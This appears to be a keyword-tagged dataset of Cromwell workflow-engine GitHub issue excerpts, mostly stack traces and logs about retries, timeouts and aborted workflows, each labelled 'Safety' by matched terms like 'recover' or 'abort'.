`inputs.json`?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5579:1638,recover,recovering,1638,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5579,1,['recover'],['recovering']
Safety,"the following sample error:; ```; ""failures"": [; {; ""causedBy"": [; {; ""causedBy"": [; {; ""causedBy"": [],; ""message"": ""503 Service Unavailable\nBackend Error""; }; ],; ""message"": ""Could not read from gs://broad-epi-cromwell/workflows/ChipSeq/ce6a5671-baf6-4734-a32b-abf3d9138e9b/call-epitope_classifier/memory_retry_rc: 503 Service Unavailable\nBackend Error""; }; ],; ""message"": ""[Attempted 1 time(s)] - IOException: Could not read from gs://broad-epi-cromwell/workflows/ChipSeq/ce6a5671-baf6-4734-a32b-abf3d9138e9b/call-epitope_classifier/memory_retry_rc: 503 Service Unavailable\nBackend Error""; }; ]; ```. In https://github.com/broadinstitute/cromwell/issues/6154 @freeseek reports that Cromwell is unexpectedly failing to retry 504s and provides the following sample error:; ```; {; ""causedBy"": [; {; ""causedBy"": [; {; ""message"": ""504 Gateway Timeout\nGET https://storage.googleapis.com/download/storage/v1/b/mccarroll-mocha/o/cromwell%2Fcromwell-executions%2Fmocha%2F86d47e9a-5745-4ec0-b4eb-0164f073e5f4%2Fcall-idat2gtc%2Fshard-73%2Frc?alt=media"",; ""causedBy"": []; }; ],; ""message"": ""Could not read from gs://mccarroll-mocha/cromwell/cromwell-executions/mocha/86d47e9a-5745-4ec0-b4eb-0164f073e5f4/call-idat2gtc/shard-73/rc: 504 Gateway Timeout\nGET https://storage.googleapis.com/download/storage/v1/b/mccarroll-mocha/o/cromwell%2Fcromwell-executions%2Fmocha%2F86d47e9a-5745-4ec0-b4eb-0164f073e5f4%2Fcall-idat2gtc%2Fshard-73%2Frc?alt=media""; }; ],; ""message"": ""[Attempted 1 time(s)] - IOException: Could not read from gs://mccarroll-mocha/cromwell/cromwell-executions/mocha/86d47e9a-5745-4ec0-b4eb-0164f073e5f4/call-idat2gtc/shard-73/rc: 504 Gateway Timeout\nGET https://storage.googleapis.com/download/storage/v1/b/mccarroll-mocha/o/cromwell%2Fcromwell-executions%2Fmocha%2F86d47e9a-5745-4ec0-b4eb-0164f073e5f4%2Fcall-idat2gtc%2Fshard-73%2Frc?alt=media""; }; ```; Our regexes did not allow for the `\n` in the Google errors. I believe this bug came about when copy-pasting to create the test cases.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6155:1387,Timeout,Timeout,1387,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6155,2,['Timeout'],['Timeout']
Safety,"the logs: ; `; 2016-12-12 18:22:26,139 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(8a965a5e)]: Abort received. Aborting 11 EJEAs; 2016-12-12 18:29:42,727 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(73be7f27)]: Abort received. Aborting 13 EJEAs; 2016-12-12 18:31:29,146 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(13965e09)]: Abort received. Aborting 10 EJEAs; 2016-12-12 18:31:46,093 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(804a56b6)]: Abort received. Aborting 11 EJEAs; 2016-12-12 18:32:05,063 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(2c6302c8)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:32:25,094 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(793dd16f)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:32:38,555 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(4fddebd4)]: Abort received. Aborting 13 EJEAs; 2016-12-12 18:32:50,674 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(aadd5082)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:01,265 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(edaa9993)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:12,453 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(c2caa0f6)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:30,399 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(17a61aa5)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:42,564 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(f6bef34c)]: Abort received. Aborting 9 EJEAs; 2016-12-12 18:34:05,494 cromwell-system-ak",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:1448,Abort,Aborting,1448,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Aborting']
Safety,ther.scala:702); cats.instances.EitherInstances$$anon$1.flatMap(either.scala:36); cats.instances.EitherInstances$$anon$1.flatMap(either.scala:32); cats.data.Kleisli.$anonfun$andThen$1(Kleisli.scala:37); languages.wdl.draft3.WdlDraft3LanguageFactory.getWomBundle(WdlDraft3LanguageFactory.scala:50); languages.wdl.draft3.WdlDraft3LanguageFactory.$anonfun$validateNamespace$2(WdlDraft3LanguageFactory.scala:39); scala.util.Either.flatMap(Either.scala:338); languages.wdl.draft3.WdlDraft3LanguageFactory.validateNamespace(WdlDraft3LanguageFactory.scala:38); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.$anonfun$buildWorkflowDescriptor$7(MaterializeWorkflowDescriptorActor.scala:242); cats.data.EitherT.$anonfun$flatMap$1(EitherT.scala:80); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:128); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJo,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3751:9139,unsafe,unsafeToFuture,9139,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3751,1,['unsafe'],['unsafeToFuture']
Safety,ther.scala:702); cats.instances.EitherInstances$$anon$1.flatMap(either.scala:36); cats.instances.EitherInstances$$anon$1.flatMap(either.scala:32); cats.data.Kleisli.$anonfun$andThen$1(Kleisli.scala:37); languages.wdl.draft3.WdlDraft3LanguageFactory.getWomBundle(WdlDraft3LanguageFactory.scala:50); languages.wdl.draft3.WdlDraft3LanguageFactory.$anonfun$validateNamespace$2(WdlDraft3LanguageFactory.scala:39); scala.util.Either.flatMap(Either.scala:338); languages.wdl.draft3.WdlDraft3LanguageFactory.validateNamespace(WdlDraft3LanguageFactory.scala:38); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.$anonfun$buildWorkflowDescriptor$7(MaterializeWorkflowDescriptorActor.scala:242); cats.data.EitherT.$anonfun$flatMap$1(EitherT.scala:80); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:138); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:269); cats.effect.IO.unsafeToFuture(IO.scala:341); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJo,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6999:11963,unsafe,unsafeToFuture,11963,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6999,1,['unsafe'],['unsafeToFuture']
Safety,"this is a critical issue of cromwell/wdltool, how did Broad avoid this issue in its internal pipeline using cromwell/wdl? this feature of WDL seems to be so commonly used in pipeline development.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2756#issuecomment-337931672:60,avoid,avoid,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2756#issuecomment-337931672,1,['avoid'],['avoid']
Safety,tionActor.scala:804); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.execute(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover(StandardAsyncExecutionActor.scala:821); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover$(StandardAsyncExecutionActor.scala:821); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.recover(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:829); 	at scala.util.Try$.apply(Try.scala:210); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:829); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:829); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.recoverAsync(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:1253); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:1248); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.executeOrRecover(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncBackendJobExecutionActor.scala:65); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:46); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:62); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover(AsyncBackendJobExecutionActor.scala:65); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutio,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7495:3584,recover,recoverAsync,3584,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7495,2,['recover'],['recoverAsync']
Safety,"titute/cromwell/blob/832387f34f57062abd2ce6cfa9e206407170ba72/backend/src/main/scala/cromwell/backend/async/AsyncBackendJobExecutionActor.scala) file, and some of the important stores would be the [ExecutionStore](https://github.com/broadinstitute/cromwell/blob/832387f34f57062abd2ce6cfa9e206407170ba72/core/src/main/scala/cromwell/core/ExecutionStore.scala), the [BackendJobDescriptor and BackendJobDescriptorKey](https://github.com/broadinstitute/cromwell/blob/832387f34f57062abd2ce6cfa9e206407170ba72/backend/src/main/scala/cromwell/backend/package.scala#L17-31), which contain the [Call containing the AST](https://github.com/broadinstitute/wdl4s/blob/d7e19c9f4dfbc5ad912cf641af9c640eb8a9a9c7/src/main/scala/wdl4s/Call.scala#L10-61) and sequence of [Tasks](https://github.com/broadinstitute/wdl4s/blob/d7e19c9f4dfbc5ad912cf641af9c640eb8a9a9c7/src/main/scala/wdl4s/Task.scala). Since the WorkflowManagerActor (WMA) is just an asynchronous queue selecting the workflow based on the root and its dependencies, then it sounds to be just a scheduling pool service submitting to the EJEA, which prepares it for the specific backend. The recovery for the EJEA is assumed to be an uniform designed protocol, which prepares the execution for the specific backend. . Regarding the backend recovery, since at the core the implementations is really Java (even though everything is in Scala), one can save the running state periodically through serialized snapshots, using something like [Apache JavaFlow](http://commons.apache.org/sandbox/commons-javaflow/) or another similar approach. If this becomes too cumbersome and the cost of resubmitting a job to a specific Backend is on the average time-span not excessive, then resubmitting the whole job might be Occam's razor. There are other approaches, depending on the preferability of flexibility, and I am sure I might have miswrote/misinterpreted something here based on my periodic analysis of the source code - so feel free to correct me :). Thanks,; ~p",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1117#issuecomment-230645371:1335,recover,recovery,1335,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1117#issuecomment-230645371,2,['recover'],['recovery']
Safety,"tl;dr I'd like to squash / rebase / merge this despite a test failure during one run since I think that failure was due to unrelated Docker pull issues. So one build for this branch failed:. https://travis-ci.org/broadinstitute/cromwell/builds/113532462. The first failure was a docker test, and looking at this more closely something seems to have gone awry pulling the Docker image. Our build scripts should pre-pull `ubuntu:latest` and normally this takes about 10 seconds and produces a nice success message. In this run the Docker image pull took more than 43 seconds and the success message appears to be cut off:. ```; Pulling repository docker.io/library/ubuntu; age for ubuntu:latest; ```. The Docker test looks like it's going fine until it's time to actually run a call, at which point there are no log messages for 16 seconds, and when the log message does arrive it seems to indicate a timeout:. ```; [INFO] [03/03/2016 23:43:02.128] [test-system-akka.actor.default-dispatcher-2] [WorkflowActor(akka://test-system)] WorkflowActor [UUID(299b2fc4)]: persisting status of a to Starting.; [WARN] [03/03/2016 23:43:18.664] [test-system-akka.actor.default-dispatcher-4] [akka://test-system/system/IO-TCP/selectors/$a/1] received dead letter from Actor[akka://test-system/user/IO-HTTP/group-0/1#-1001288108]: Write(ByteString(),spray.io.SslTlsSupport$WriteChunkAck$@22a4ed01); ```. There's another 13 second hang shortly thereafter:. ```; [INFO] [03/03/2016 23:43:19.002] [test-system-akka.actor.default-dispatcher-10] [WorkflowActor(akka://test-system)] WorkflowActor [UUID(299b2fc4)]: persisting status of a to Running.; [INFO] [03/03/2016 23:43:32.134] [pool-7-thread-13-ScalaTest-running-CallCachingWorkflowSpec] [akka://test-system/user/$$h] WorkflowManagerActor submitWorkflow input id = None, effective id = c21e652b-b5f0-4435-a390-b1d61d1c9b4a; ```. Next it looks like a test is started up while pointing to the same in-memory db as this paused workflow. The paused workflow is interpret",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/502#issuecomment-192361344:899,timeout,timeout,899,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/502#issuecomment-192361344,2,['timeout'],['timeout']
Safety,"tor [4dbd7d1cHelloWorld.WriteGreeting:NA:1]: job id: 115; [2018-08-30 17:53:31,10] [info] BackgroundConfigAsyncJobExecutionActor [4dbd7d1cHelloWorld.WriteGreeting:NA:1]: Status change from - to Done; [2018-08-30 17:53:33,13] [info] WorkflowExecutionActor-4dbd7d1c-e7e8-4f83-9750-5c638d1567bc [4dbd7d1c]: Workflow HelloWorld complete. Final Outputs:; {; ""HelloWorld.WriteGreeting.outfile"": ""/gatk/wsb/cromwell-executions/HelloWorld/4dbd7d1c-e7e8-4f83-9750-5c638d1567bc/call-WriteGreeting/execution/stdout""; }; [2018-08-30 17:53:33,18] [info] WorkflowManagerActor WorkflowActor-4dbd7d1c-e7e8-4f83-9750-5c638d1567bc is in a terminal state: WorkflowSucceededState; [2018-08-30 17:53:36,13] [info] SingleWorkflowRunnerActor workflow finished with status 'Succeeded'.; {; ""outputs"": {; ""HelloWorld.WriteGreeting.outfile"": ""/gatk/wsb/cromwell-executions/HelloWorld/4dbd7d1c-e7e8-4f83-9750-5c638d1567bc/call-WriteGreeting/execution/stdout""; },; ""id"": ""4dbd7d1c-e7e8-4f83-9750-5c638d1567bc""; }; [2018-08-30 17:53:41,12] [info] Workflow polling stopped; [2018-08-30 17:53:41,13] [info] Shutting down WorkflowStoreActor - Timeout = 5 seconds; [2018-08-30 17:53:41,14] [info] Aborting all running workflows.; [2018-08-30 17:53:41,15] [info] WorkflowStoreActor stopped; [2018-08-30 17:53:41,15] [info] Shutting down WorkflowLogCopyRouter - Timeout = 5 seconds; [2018-08-30 17:53:41,15] [info] Shutting down JobExecutionTokenDispenser - Timeout = 5 seconds; [2018-08-30 17:53:41,15] [info] JobExecutionTokenDispenser stopped; [2018-08-30 17:53:41,17] [info] WorkflowLogCopyRouter stopped; [2018-08-30 17:53:41,17] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2018-08-30 17:53:41,17] [info] WorkflowManagerActor All workflows finished; [2018-08-30 17:53:41,17] [info] WorkflowManagerActor stopped; [2018-08-30 17:53:41,17] [info] Connection pools shut down; [2018-08-30 17:53:41,18] [info] Shutting down SubWorkflowStoreActor - Timeout = 1800 seconds; [2018-08-30 17:53:41,18] [info] SubWorkf",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4062:4551,Timeout,Timeout,4551,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4062,2,"['Abort', 'Timeout']","['Aborting', 'Timeout']"
Safety,tor.execute(StandardAsyncExecutionActor.scala:805); 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute$(StandardAsyncExecutionActor.scala:804); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.execute(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover(StandardAsyncExecutionActor.scala:821); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover$(StandardAsyncExecutionActor.scala:821); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.recover(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:829); 	at scala.util.Try$.apply(Try.scala:210); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:829); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:829); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.recoverAsync(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:1253); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:1248); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.executeOrRecover(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncBackendJobExecutionActor.scala:65); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:46); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:62); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover(AsyncBackendJo,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7495:3451,recover,recoverAsync,3451,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7495,2,['recover'],['recoverAsync']
Safety,"tractGoogleClientRequest.java:352); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:19,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:20,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:21,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:22,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:23,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:24,84] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.jav",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:7559,abort,abort,7559,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"tractGoogleClientRequest.java:352); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:24,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:25,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:26,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:27,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:28,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:29,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:30,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:31,53] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClient",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:9660,abort,abort,9660,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"tractGoogleClientRequest.java:352); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:31,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:32,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:33,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:34,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:35,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:36,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:37,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:38,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:39,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:40,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:41,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:42,05] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:1",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:11899,abort,abort,11899,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"tractGoogleClientRequest.java:352); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:42,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:43,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:44,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:45,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:46,38] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at 